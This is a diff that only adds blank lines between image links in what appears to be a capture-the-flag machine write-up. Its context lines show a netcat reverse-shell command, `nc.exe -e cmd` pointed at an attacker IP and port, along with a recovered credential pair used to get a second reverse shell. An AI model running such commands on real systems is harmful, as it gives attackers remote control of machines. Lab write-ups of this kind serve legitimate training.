@@ -87,6 +87,7 @@ Nmap done: 1 IP address (1 host up) scanned in 78.05 seconds
   - So I used `nc`: `/c c:\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.16.12 6666`
 
 ![](./images/5.png)
+
 ![](./images/6.png)
 
 ## User
@@ -113,15 +114,20 @@ Nmap done: 1 IP address (1 host up) scanned in 78.05 seconds
     - `app:mesh5143`
 
 ![](./images/9.png)
+
 ![](./images/10.png)
+
 ![](./images/11.png)
+
 ![](./images/12.png)
+
 ![](./images/13.png)
 
 - Creds work to access the page on port `8080`
   - Get reverse shell
 
 ![](./images/14.png)
+
 ![](./images/15.png)
 
 
